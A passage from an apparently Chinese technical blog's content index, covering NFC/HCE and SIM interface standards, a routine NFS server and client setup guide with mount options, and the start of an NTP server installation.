14443-4</code>）的模拟卡，要求仅使用 Nfc-A (<code>ISO/IEC 14443-3 Type A</code>) 技术模拟 ISO-DEP，但也可以支持 Nfc-B (<code>ISO/IEC 14443-4 Type B</code>) 技术。</p>\n<p>该标准包含四个部分：</p>\n<ul>\n<li><code>ISO/IEC14443-1</code>:制定了有关非接触卡的物理特性；</li>\n<li><code>ISO/IEC14443-2</code>:制定了有关射频功率及信号界面的特性；</li>\n<li><code>ISO/IEC14443-3</code>:则为非接触卡的初始化及防冲突机制；</li>\n<li><code>ISO/IEC14443-4</code>:位有关的交易协定。</li>\n</ul>\n<p>ISO&#x2F;IEC14443-3 定义了 TYPE A、TYPEB 两种卡型（与飞利浦的 Mifare 标准兼容），均通过13.56Mhz的射频载波传送信号，此外索尼公司开发了FeliCa 标准，也成为TYPE F。<br>不同TYPE的主要的区别在于信号发送的载波调制深度、二进制数编码方式存在差异。<br>此外，防冲突机制的原理也完全不同，TYPE A是基于 BIT 冲突检测协议，TYPE B则是通过字节、帧及命令完成防冲突。</p>\n<h3 id=\"SWP单线协议-Single-Wire-Protocol\"><a href=\"#SWP单线协议-Single-Wire-Protocol\" class=\"headerlink\" title=\"SWP单线协议(Single Wire Protocol)\"></a>SWP单线协议(Single Wire Protocol)</h3><p>手机与普通非接触IC卡最大的不同体现在拥有网络功能和人机交互两部分，因此，NFC手机可以从事传统非接触IC所不能完成的丰富业务，如空中充值、余额查询。所有这些业务均需要一个技术前提即需要一个标准的SIM卡访问接口，能够使得应用客户端访问SIM卡并与SIM卡中的applet进行通信。具体讲，需要在手机中支持三个标准：</p>\n<ol>\n<li><p>SIM Alliance Open Mobile API：为应用客户端提供与SIM卡通信的通道</p>\n</li>\n<li><p>Global Platform&#x2F;GSMA：Secure Element Access Control：授权应用客户端访问SIM卡中对应的applet</p>\n</li>\n<li><p>Modem：需完全支持3GPP 27.007标准，支持打开SIM卡逻辑通道，并能够在逻辑通信上真正实现APDU的透传</p>\n</li>\n</ol>\n<img src=\"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/swp.jpg\" class=\"\" title=\"对比分析\">\n\n<p>SWP(Single Wire Protocol)是采用C6引脚的单线连接方案。在SWP方案中，接口界面包括三根线：VCC(C1)、GND(C5)和SWP(C6)，其中SWP一根信号线上基于电压和负载调制原理实现全双工通讯，这样可以实现SIM卡在ISO7816界面定义下同时支持7816和SWP两个接口，并预留了扩展第三个高速(USB)接口的引脚。支持SWP的SIM卡必须同时支持ISO和SWP两个协议栈，需要SIM的COS是多任务的OS系统，并且这两部分需要独立管理的，ISO界面的RST信号不能对SWP部分产生影响。</p>\n<p>　　SWP是在一根单线上实现全双工通讯，定义了S1和S2两个方向的信号， SWP传输的波特率可以从106KBPS最高上升至2MBPS。从SWP的定义看，SWP方案同时满足ISO7816、NFC和大容量高速接口，并且是全双工通讯，可以实现较高波特率。SWP系统地定义了从物理层、链路层到应用层的多层协议，并已经上升成为ETSI的标准，正在争取成为ISO的标准，目前得到业界较多的支持。从另一个角度看，SWP方案要求SIM卡和NFC模拟前端芯片同时重新设计，涉及的面比较广，市场推进的难度较大。另外，NFC应用非常关注掉电模式下的应用，SWP的S2负载调制通讯方式带来接口的功耗损失，对掉电模式下的性能有不利影响。</p>\n<h3 id=\"ISO-IEC-7816\"><a href=\"#ISO-IEC-7816\" class=\"headerlink\" title=\"ISO&#x2F;IEC 7816\"></a>ISO&#x2F;IEC 7816</h3><p>Android处理应用协议数据单元 (APDU)遵循的是<code>ISO/IEC 7816-4</code>规范。</p>\n<p>Android系统上的HCE技术是通过系统服务实现的(HCE服务)。使用服务的一大优势是它可以一直在后台运行而不需要有用户界面。这个特点就使得HCE技术非常适合像会员卡、交通卡、门禁卡这类的交易，当用户使用时无需打开程序，只需要将手机放到NFC读卡器的识别范围内，交易就会在后台进行。当然如果有必要的话，用户也可以打开UI界面。这时的手机和普通的智能卡片已经没有区别了。</p>\n<h4 id=\"服务选择AID\"><a href=\"#服务选择AID\" class=\"headerlink\" title=\"服务选择AID\"></a>服务选择AID</h4><p>交易中我们有一个重要问题需要解决，当用户将手机放到NFC读卡器的识别范围时,Android系统需要知道读卡器真正想要和哪个HCE服务交互，这样它才能将接收到的数据发送至相应的服务。ISO&#x2F;IEC 7816-4规范正是解决服务选择的问题，它定义了一种通过应用程序ID(AID)来选择相应服务的方法。</p>\n<p>一个AID占16位，如果手机模拟的是一个已经存在的NFC读卡设施，那么这些NFC读卡设施会去寻找那些经公共注册而广为人知的AID(类似于端口号)。像Visa卡和万事达卡等这些智能卡可以注册 AID号作为他们专用的识别标志。反之，如果要为自己的新的读卡设施部署NFC应用，你就需要注册自己的AID。AID注册过程在ISO&#x2F;IEC 7816-5规格中定义，为防止和其他的Android程序冲突，Google建议AID号按此规格中推荐的注册。</p>\n<p>当用户将设备接近 NFC 读写器时，Android 系统需要知道 NFC 读写器实际上想要与哪个 HCE 服务对话。这就是<code>ISO/IEC 7816-4</code>规范的来源：它定义了一种以应用程序 ID（AID）为中心的选择应用程序的方法。</p>\n<p>AID 由 16 个字节组成。如果您正在为现有的 NFC 读写器基础设施模拟卡片，这些读者正在寻找的 AID 通常是众所周知的和公开注册的（例如，支付网络的 AID，如 Visa 和 MasterCard）。</p>\n<p>如果您想为自己的应用程序部署新的读取器基础设施，则需要注册您自己的 AID。AID 的注册过程在<code>ISO/IEC 7816-5</code>规范中定义。谷歌建议，如果您正在为 Android 部署 HCE 应用程序，可以按照 7816-5 注册一个 AID，它可避免与其他应用程序发生冲突。</p>\n<h4 id=\"AID组\"><a href=\"#AID组\" class=\"headerlink\" title=\"AID组\"></a>AID组</h4><p>在某些情况下，HCE 服务可能需要注册多个 AID 才能实现某个应用程序，并且需要确保它是所有这些 AID 的默认处理程序（与另一服务的组中的某些 AID 相反）。</p>\n<p>AID 组是一系列被视为属于共同的操作系统 AID 。对于一个 AID 组中的 AID，Android 可以保证以下一项：</p>\n<p>组中的所有 AID 都被路由至此 HCE 服务。<br>组中没有任何 AID 被路由至此 HCE 服务（例如，服务请求组中的一个或多个 AID，而用户优先选择另一服务）。<br>换句话说，不存在中间状态，其中该组中的一些 AID 可以被路由到一个 HCE 服务，而另一些可以路由到另一个 HCE 服务。</p>\n<h4 id=\"AID组和类别\"><a href=\"#AID组和类别\" class=\"headerlink\" title=\"AID组和类别\"></a>AID组和类别</h4><p>每个 AID 组都与一个类别关联。这使得 Android 可以按类别将 HCE 服务分组，并且反过来允许用户在类别级别上设置默认值而不是 AID 级别。通常，避免在应用程序中任何面向用户的部分中提到 AID：它们对普通用户没有任何意义。</p>\n<p>Android 4.4 支持两种类别：<code>CATEGORY_PAYMENT</code>（覆盖行业标准支付应用）和<code>CATEGORY_OTHER</code>（对应于所有其它 HCE 应用）。</p>\n<p>注意：在任何给定时间，在系统中只能启用CATEGORY_PAYMENT类别中的一个 AID 组。通常，这将是一个应用程序，了解主要的信用卡支付协议，可以在任何商家工作。</p>\n<p>对于仅在一个商家（例如储值卡）工作的闭环支付应用，您应该使用CATEGORY_OTHER。该类别中的 AID 组可以总是活动的，并且在必要时可以在 AID 选择期间由 NFC 读写器给予优先级。</p>\n<h2 id=\"超级SIM卡的通信接口\"><a href=\"#超级SIM卡的通信接口\" class=\"headerlink\" title=\"超级SIM卡的通信接口\"></a>超级SIM卡的通信接口</h2><p>通信接口指的是 SIM 卡与外部终端设备进行通信的接口，应支持 ISO7816 和 SWP 两种接口。</p>\n<ul>\n<li>ISO7816 接口是 SIM 卡与外部终端设备进行通信的接触式 I&#x2F;O 接口，遵循 ETSI 102.221 的要求。</li>\n<li>SWP 接口是 SIM 卡与外部非接触终端设备进行通信，实现近场通信相关业务 的物理接口。<br>  超级 SIM 卡支持 SWP 协议，遵循 ETSI TS 102.613 的要求。支持卡 模拟模式、读卡器模式，可选支持点对点传输模式。</li>\n</ul>\n<p>移动终端若支持 NFC 功能，则应支持 SWP 接口，与超级 SIM 卡协同实现刷卡 操作，为用户提供基于非接触感应的线下应用场景。</p>\n<h3 id=\"应用层的技术标准\"><a href=\"#应用层的技术标准\" class=\"headerlink\" title=\"应用层的技术标准\"></a>应用层的技术标准</h3><p>NFC手机可以从事传统非接触IC所不能完成的丰富业务，如空中充值、余额查询。所有这些业务均需要一个技术前提即需要一个标准的SIM卡访问接口，能够使得应用客户端访问SIM卡并与SIM卡中的applet进行通信。具体讲，需要在手机中支持三个标准：</p>\n<ol>\n<li><p>SIM Alliance Open Mobile API：为应用客户端提供与SIM卡通信的通道</p>\n</li>\n<li><p>Global Platform&#x2F;GSMA：Secure Element Access Control：授权应用客户端访问SIM卡中对应的applet</p>\n</li>\n<li><p>Modem：需完全支持3GPP 27.007标准，支持打开SIM卡逻辑通道，并能够在逻辑通信上真正实现APDU的透传</p>\n</li>\n</ol>\n<hr>\n<h2 id=\"附录一：SIM卡的技术标准\"><a href=\"#附录一：SIM卡的技术标准\" class=\"headerlink\" title=\"附录一：SIM卡的技术标准\"></a>附录一：SIM卡的技术标准</h2><p>SIM卡是一个装有微处理器的芯片卡，它的内部有5个模块，并且每个模块都对应一个功能：、</p>\n<ul>\n<li>微处理器CPU（8位）</li>\n<li>程序存储器ROM（3–8kbit）</li>\n<li>工作存储器RAM（6–16kbit）</li>\n<li>数据存储器EEPROM（128–256kbit）</li>\n<li>串行通信单元。</li>\n</ul>\n<img src=\"/2020/12/30/NFC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88/sim.jpeg\" class=\"\" title=\"对比分析\">\n\n<p>这5个模块被胶封在SIM卡铜制接口后与普通IC卡封装方式相同。这五个模块必须集成在一块集成电路中，否则其安全性会受到威胁。因为，芯片间的连线可能成为非法存取和盗用SIM卡的重要线索。</p>\n<p>SIM卡同手机连接时至少需要5条连接线（通常编程口未定义）</p>\n<ul>\n<li>数据I&#x2F;O口（Data）</li>\n<li>复位（RST）</li>\n<li>接地端（GND）</li>\n<li>电源（Vcc）</li>\n<li>时钟（CLK）</li>\n</ul>\n<p>如上图所示。</p>\n<p>SIM卡的供电分为5V（1998年前发行）、5V与3V兼容、3V、1.8V等，当然这些卡必须与相应的移动电话机配合使用，即移动电话机产生的SIM卡供电电压与该SIM卡所需的电压相匹配。卡电路中的电源VCC、地GND是卡电路工作的必要条件。卡电源用万用表就可以检测到。SIM卡插入移动电话机后，电源端口提供电源给SIM卡内各模块。</p>\n<h2 id=\"附录二：主流NFC硬件厂商和芯片型号\"><a href=\"#附录二：主流NFC硬件厂商和芯片型号\" class=\"headerlink\" title=\"附录二：主流NFC硬件厂商和芯片型号\"></a>附录二：主流NFC硬件厂商和芯片型号</h2><table>\n<thead>\n<tr>\n<th align=\"center\">射频前端芯片</th>\n<th align=\"center\">读卡器&#x2F;NFC芯片</th>\n<th align=\"center\">卡芯片</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">德州仪器：TI TRF7970A</td>\n<td align=\"center\">恩智浦：NXP PN532</td>\n<td align=\"center\">复旦微电子：FMSH FM1208</td>\n</tr>\n<tr>\n<td align=\"center\">复旦微电子：FMSH FM11NC08S</td>\n<td align=\"center\">恩智浦：NXP PN7150</td>\n<td align=\"center\">华翼微电子 HYm4616A1&#x2F;2&#x2F;3&#x2F;4&#x2F;5&#x2F;6</td>\n</tr>\n<tr>\n<td align=\"center\">-</td>\n<td align=\"center\">意法半导体：ST CR95HF</td>\n<td align=\"center\">华翼微电子： HYm4616A7</td>\n</tr>\n<tr>\n<td align=\"center\">-</td>\n<td align=\"center\">华大电子：HED CIE72D01</td>\n<td align=\"center\">-</td>\n</tr>\n</tbody></table>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://blog.csdn.net/icycityone/article/details/17358357\">NFC-SWP终端架构与标准</a></li>\n<li><a href=\"https://developer.android.com/guide/topics/connectivity/nfc/hce?hl=zh-cn\">Android的NFC官方文档</a></li>\n<li><a href=\"https://www.mpaypass.com.cn/news/201307/12110718.html\">NFC SWP移动支付解决方案技术分析</a></li>\n<li><a href=\"http://tech.rfidworld.com.cn/2010_07/04cd42c1fd6aac1d.html\">近距离通信的SWP方案及其在SIM卡的实现</a></li>\n<li><a href=\"https://blog.csdn.net/xiaoxik/article/details/82156455\">SIM卡详解</a></li>\n<li><a href=\"http://www.jiajuhf.com/zxxw_8/42705634.html\">关于HCE的NFC支付研究报告及其安全性探讨</a></li>\n<li><a href=\"http://article.iotxfd.cn/RFID/Host-based%20card%20emulation\">基于主机的卡模拟概览</a></li>\n<li><a href=\"https://blog.csdn.net/wwww1988600/article/details/69523369\">HCE基础知识普及</a></li>\n<li><a href=\"https://blog.csdn.net/liwei16611/article/details/85209361\">NFC之 Type A 与 TYpe B 卡区别</a></li>\n<li><a href=\"http://www.cmricloud.com/pdf/07/1.pdf\">超级SIM卡的技术白皮书</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s?src=3&timestamp=1625732247&ver=1&signature=YhDcKm20OjT1SqXPV4ZZjLRQtlP42pVugJP77ZqfP6lSnDV7-d-WYWFpxgd-qXkSJ7EwF-g7TpH2pu5MDifsfvGJsEF1yY9jmRZa*elztII6P9xrvmw53XvWBsp-ztpwDYuS4VXwrXgHrA4p4NpNaQ==\">基于HCE移动支付研究报告</a></li>\n<li><a href=\"http://www.nfcin.com.cn/news/201403/11110054.html\">NFC-SWP连接方案在SIM卡中的实现方法</a></li>\n</ul>\n"},{"title":"NFS网络文件共享的安装要点","url":"/2021/12/11/NFS%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E7%9A%84%E5%AE%89%E8%A3%85%E8%A6%81%E7%82%B9/","content":"<p>NFS - Network File System（网络文件系统），是一种基于TCP&#x2F;IP传输的网络文件系统协议，最早由SUN公司研发，通过使用NFS协议，客户机可以像访问本地目录一样，访问远程服务器中的共享资源。<br>NFS 的基本原则是“容许不同的客户端及服务端通过一组RPC分享相同的文件系统”，它是独立于操作系统，容许不同硬件及操作系统的系统共同进行文件的分享。</p>\n<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>NFS在文件传送或信息传送过程中依赖于RPC协议。RPC，远程过程调用 (Remote Procedure Call) 是能使客户端执行其他系统中程序的一种机制。NFS本身是没有提供信息传输的协议和功能的，但NFS却能让我们通过网络进行资料的分享，这是因为NFS使用了一些其它的传输协议。而这些传输协议用到这个RPC功能的。可以说NFS本身就是使用RPC的一个程序。或者说NFS也是一个RPC SERVER。所以只要用到NFS的地方都要启动RPC服务，不论是NFS SERVER或者NFS CLIENT。这样SERVER和CLIENT才能通过RPC来实现PROGRAM PORT的对应。</p>\n<p>可以这么理解RPC和NFS的关系：NFS是一个文件系统，而RPC是负责负责信息的传输。</p>\n<p>目前最新版本是 NFS 4.X，但3.X版本仍然很普遍。</p>\n<p>启用NFS服务器，只需要安装两个软件包<code>nfs-utils</code> 和<code>rpcbind</code>（前身为<code>portmap</code>软件包，任务是提供RPC服务）。<br>由于<code>nfs-utils</code>软件包依赖<code>rpcbind</code>软件，所以使用yum安装时只需要<code>yum install -y nfs-utils</code>就搞定了。</p>\n<p>从NFS服务端的角度看，包含2个核心后台进程：</p>\n<ul>\n<li><code>nfsd</code>：它是基本的NFS守护进程，主要功能是管理客户端是否能够登录服务器；</li>\n<li><code>rpc.mountd</code>：它是RPC安装守护进程，主要功能是管理NFS的文件系统。当客户端顺利通过nfsd登录NFS服务器后，在使用NFS服务所提供的文件前，还必须通过文件使用权限的验证。它会读取NFS的配置文件<code>/etc/exports</code>来对比客户端权限。</li>\n</ul>\n<p>当客户端尝试使用RPC Server所提供的服务时，由于Client需要取得一个可以连接的端口（port）才能够使用RPC Server所提供的服务，因此，客户端首先去请求rpcbind，然后，rpcbind将自己管理的端口映射告知客户端，好让客户端可以连接上服务，因此启动NFS之前，一定要先启动rpcbind。</p>\n<blockquote>\n<p>RPC后台服务占用网络端口111，<code>/etc/services</code>中描述为<code>sunrpc</code>，并有TCP和UDP两种模式。</p>\n</blockquote>\n<p>NFS的常用目录</p>\n<ul>\n<li>&#x2F;etc&#x2F;exports：NFS服务的主要配置文件</li>\n<li>&#x2F;usr&#x2F;sbin&#x2F;exportfs：NFS服务的管理命令</li>\n<li>&#x2F;usr&#x2F;sbin&#x2F;showmount：客户端的查看命令</li>\n<li>&#x2F;var&#x2F;lib&#x2F;nfs&#x2F;etab：记录NFS分享出来的目录的完整权限设定值</li>\n<li>&#x2F;var&#x2F;lib&#x2F;nfs&#x2F;xtab：记录曾经登录过的客户端信息</li>\n</ul>\n<h2 id=\"NFS-Server-安装方法\"><a href=\"#NFS-Server-安装方法\" class=\"headerlink\" title=\"NFS Server 安装方法\"></a>NFS Server 安装方法</h2><h3 id=\"1-Server软件安装\"><a href=\"#1-Server软件安装\" class=\"headerlink\" title=\"1. Server软件安装\"></a>1. Server软件安装</h3><p>安装<code>nfs-utils</code>软件包，并设置系统启动服务<code>rpcbind</code>和<code>nfs</code>。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y nfs-utils</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：如果启用了防火墙，需要打开 rpc-bind 和 nfs 的服务</p>\n</blockquote>\n<h3 id=\"2-Server服务配置\"><a href=\"#2-Server服务配置\" class=\"headerlink\" title=\"2. Server服务配置\"></a>2. Server服务配置</h3><p>为加载NFS服务，需要创建一个共享目录。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> /data</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 755 /data</span><br></pre></td></tr></table></figure>\n\n<p>根据这个加载点，在<code>/etc/exports</code>配置导出目录，添加如下行：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">/data/     192.168.0.0/24(rw,sync,no_root_squash,no_all_squash)</span><br></pre></td></tr></table></figure>\n\n<p>主要的配置参数包括：</p>\n<ul>\n<li><code>/data</code>: 共享目录位置。</li>\n<li><code>192.168.0.0/24</code>: 客户端 IP 范围，* 代表所有，即没有限制。</li>\n<li><code>rw</code>: 权限设置，可读可写。</li>\n<li><code>sync|async</code>：&#x3D;sync，数据同步写入到内存与硬盘当中；&#x3D;async，数据会先暂存于内存当中，而非直接写入硬盘</li>\n<li><code>no_root_squash｜root_squash</code>: &#x3D;no_root_squash，如果Client的登录用户是root，则对于这个分享目录的Server来说，他就具有root的权限，也就是不压缩权限！；否则。。。</li>\n<li><code>all_squash｜no_all_squash</code>: &#x3D;all_squash，不论Client的使用者是什么身份，都会被压缩成匿名使用者；否则。。。</li>\n<li><code>anonuid= &amp; anonnid=</code>：当Client登录到分享目录中，在Server其身份是uid:gid。注意，必须在&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;group中存在该ID。</li>\n</ul>\n<blockquote>\n<p>squash：这里是动词 “压缩、压扁”的意思，还有的含义是名词“南瓜、壁球”</p>\n</blockquote>\n<h3 id=\"3-Server启动服务\"><a href=\"#3-Server启动服务\" class=\"headerlink\" title=\"3. Server启动服务\"></a>3. Server启动服务</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"built_in\">enable</span> rpcbind --now</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> nfs --now</span><br><span class=\"line\">systemctl status rpcbind</span><br><span class=\"line\">systemctl status nfs</span><br><span class=\"line\">showmount -e localhost</span><br></pre></td></tr></table></figure>\n\n<p>这样，服务端就配置好了，接下来配置客户端，连接服务端，使用共享目录。</p>\n<h2 id=\"NFS-Client-安装方法\"><a href=\"#NFS-Client-安装方法\" class=\"headerlink\" title=\"NFS Client 安装方法\"></a>NFS Client 安装方法</h2><h3 id=\"1-Client软件安装\"><a href=\"#1-Client软件安装\" class=\"headerlink\" title=\"1. Client软件安装\"></a>1. Client软件安装</h3><p>软件包的名称是<code>nfs-utils</code>，系统服务的名称是<code>rpcbind</code>。</p>\n<blockquote>\n<p>客户端不需要打开防火墙，因为客户端时发出请求方，网络能连接到服务端即可。<br>客户端也不需要开启 NFS 服务，因为不共享目录。</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y nfs-utils</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> rpcbind --now</span><br><span class=\"line\">systemctl status rpcbind</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Client服务配置\"><a href=\"#2-Client服务配置\" class=\"headerlink\" title=\"2. Client服务配置\"></a>2. Client服务配置</h3><p>使用<code>showmount</code>命令，查看NFS服务器资源。<br>使用<code>mount</code>命令，手工挂载NFS资源。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@yum ~]<span class=\"comment\"># showmount -e 192.168.0.139</span></span><br><span class=\"line\">Export list <span class=\"keyword\">for</span> 192.168.0.139:</span><br><span class=\"line\">/mnt/HD/HD_a2/NFS *</span><br><span class=\"line\"></span><br><span class=\"line\">[root@yum ~]<span class=\"comment\"># mount 192.168.0.139:/mnt/HD/HD_a2/NFS /mnt</span></span><br><span class=\"line\">[root@yum ~]<span class=\"comment\"># df -h</span></span><br><span class=\"line\">文件系统                         容量  已用  可用 已用% 挂载点</span><br><span class=\"line\">devtmpfs                         486M     0  486M    0% /dev</span><br><span class=\"line\">tmpfs                            496M     0  496M    0% /dev/shm</span><br><span class=\"line\">tmpfs                            496M  6.8M  489M    2% /run</span><br><span class=\"line\">tmpfs                            496M     0  496M    0% /sys/fs/cgroup</span><br><span class=\"line\">/dev/sda1                        8.0G  1.9G  6.2G   24% /</span><br><span class=\"line\">tmpfs                            100M     0  100M    0% /run/user/0</span><br><span class=\"line\">192.168.0.139:/mnt/HD/HD_a2/NFS  3.6T  2.9T  721G   81% /mnt</span><br><span class=\"line\"></span><br><span class=\"line\">[root@yum ~]<span class=\"comment\"># mount</span></span><br><span class=\"line\">sysfs on /sys <span class=\"built_in\">type</span> sysfs (rw,nosuid,nodev,noexec,relatime)</span><br><span class=\"line\">proc on /proc <span class=\"built_in\">type</span> proc (rw,nosuid,nodev,noexec,relatime)</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">192.168.0.139:/mnt/HD/HD_a2/NFS on /mnt <span class=\"built_in\">type</span> nfs (rw,relatime,vers=3,rsize=65536,wsize=65536,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,mountaddr=192.168.0.139,mountvers=3,mountport=57811,mountproto=udp,local_lock=none,addr=192.168.0.139)</span><br></pre></td></tr></table></figure>\n\n<p>其中，可以看到NFS的全部默认参数，包括：hard模式，软件版本v3，网络报文大小64K，</p>\n<h3 id=\"3-Client启动服务\"><a href=\"#3-Client启动服务\" class=\"headerlink\" title=\"3. Client启动服务\"></a>3. Client启动服务</h3><p>编辑<code>/etc/fstab</code>文件，设置系统启动时自动加载</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@yum ~]<span class=\"comment\"># more /etc/fstab</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># /etc/fstab</span></span><br><span class=\"line\"><span class=\"comment\"># Created by anaconda on Sun Nov  7 10:03:44 2021</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Accessible filesystems, by reference, are maintained under &#x27;/dev/disk&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">UUID=99f4f882-0886-4b1e-8252-a63e2ffc6cfa /                       xfs     defaults        0 0</span><br><span class=\"line\">192.168.0.139:/mnt/HD/HD_a2/NFS /mnt nfs defaults 0 0</span><br></pre></td></tr></table></figure>\n\n<p>注意：需要重启systemd服务已更新目录配置！！！</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\"><span class=\"built_in\">df</span> -h</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"经验之一：如何处理NFS服务延迟加载问题\"><a href=\"#经验之一：如何处理NFS服务延迟加载问题\" class=\"headerlink\" title=\"经验之一：如何处理NFS服务延迟加载问题\"></a>经验之一：如何处理NFS服务延迟加载问题</h2><p>NFS服务位于独立的WDCLOUD，客户端位于192.168.0.148，全部重启时由于NFS Server尚未完成启动，Client自动加载失败。<br>分析fstab的配置参数：</p>\n<ul>\n<li><code>fg/bg=fg</code>: 设置挂载失败后mount命令的行为<br>  默认为fg，表示挂载失败时将直接报错退出。<br>  如果是bg，挂载失败后会创建一个子进程不断在后台挂载，而父进程mount自身则立即退出并返回0状态码。  </li>\n<li><code>timeo=600</code>: NFS客户端等待下一次重发NFS请求的时间间隔<br>  单位为十分之一秒。默认值&#x3D;600（60秒）</li>\n<li><code>hard/soft=hard</code>: 设置NFS客户端当NFS请求超时时的恢复行为方式<br>  如果是hard，将无限重新发送NFS请求。例如在客户端使用<code>df -h</code>查看文件系统时就会不断等待。<br>  如果是soft，当retrans次数耗尽时，NFS客户端将认为NFS请求失败，从而返回一个错误给调用它的程序。</li>\n<li><code>retrans=3</code>: NFS客户端最多发送的请求次数<br>  NFS客户端最多发送次数耗尽后将报错表示连接失败。如果hard挂载选项生效，则会进一步尝试恢复连接。</li>\n<li><code>rsize,wsize=131072</code>：一次读出(rsize)和写入(wsize)的区块大小。<br>  单位为字节，必须为1024的倍数，且最大只能设置为1M。<br>  Centos 5默认1024，Cenots 6以上默认131072<br>  如果网络带宽大，这两个值设置大一点能提升传输能力。最好设置到带宽的临界值。</li>\n</ul>\n<p>解决办法是：在<code>/etc/fstab</code>中，设置nfs目录的属性为<code>bg</code>，即后台启动。</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.0.139:/mnt/HD/HD_a2/NFS /data nfs defaults,_netdev,bg 0 0</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://wiki.archlinux.org/title/NFS\">ArchLinux | NFS 官方文档</a></li>\n<li><a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/storage_administration_guide/ch-nfs\">RedHat关于 NFS 的技术文档</a></li>\n<li><a href=\"https://man.archlinux.org/man/mount.8#FILESYSTEM-INDEPENDENT_MOUNT_OPTIONS\">Linux关于 mount 的man官方手册</a></li>\n<li><a href=\"https://docs.aws.amazon.com/zh_cn/efs/latest/ug/mounting-fs-nfs-mount-settings.html\">AWS推荐的 NFS 挂载选项</a></li>\n<li><a href=\"https://www.jianshu.com/p/f85c4371a43d\">Linux 下的 NFS 系统简介</a></li>\n<li><a href=\"https://www.daimajiaoliu.com/daima/4870e3973100414\">linux环境下嵌入式产品的NFS应用</a></li>\n<li><a href=\"https://www.cnblogs.com/mchina/archive/2013/01/03/2840040.html\">Linux NFS服务器的安装与配置</a></li>\n</ul>\n"},{"title":"NTP时间同步服务器的安装记录","url":"/2020/08/22/NTP%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<p>网络时间协议（英语：Network Time Protocol，缩写：NTP）是在数据网络潜伏时间可变的计算机系统之间通过分组交换进行时钟同步的一个网络协议，位于 OSI 模型的应用层。自 1985 年以来，NTP 是当前仍在使用的最古老的互联网协议之一。NTP 由特拉华大学的 David L. Mills 设计。<br>计算机主机一般同多个时钟服务器连接，利用统计学的算法过滤来自不同服务器的时间，以选择最佳的路径和来源以便校正主机时间。即使在主机长时间无法与某一时钟服务器联系的情况下，NTP 服务依然可以有效运转。</p>\n<h2 id=\"NTP-Server的安装步骤\"><a href=\"#NTP-Server的安装步骤\" class=\"headerlink\" title=\"NTP Server的安装步骤\"></a>NTP Server的安装步骤</h2><ol>\n<li><p>安装NTP软件，并做一次手工时间校准。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y ntp</span><br><span class=\"line\">ntpdate cn.pool.ntp.org</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>编辑NTP配置文件，位于<code>/etc/ntp.conf</code></p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost etc]<span class=\"comment\"># cat /etc/ntp.conf</span></span><br><span class=\"line\">driftfile /var/lib/ntp/drift</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 允许内网其他机器同步时间</span></span><br><span class=\"line\">restrict 192.168.0.0 mask 255.255.255.0 nomodify notrap</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 配置上级时间服务器</span></span><br><span class=\"line\">server ntp.ntsc.ac.cn prefer</span><br><span class=\"line\">server ntp1.aliyun.com</span><br><span class=\"line\">server cn.pool.ntp.org</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 外部时间服务器不可用时，以本地时间作为时间服务</span></span><br><span class=\"line\">server 127.127.1.0</span><br><span class=\"line\">fudge 127.127.1.0 stratum 10</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置NTP系统启动服务</p>\n <figure class=\"highlight console\"><table><tr><td 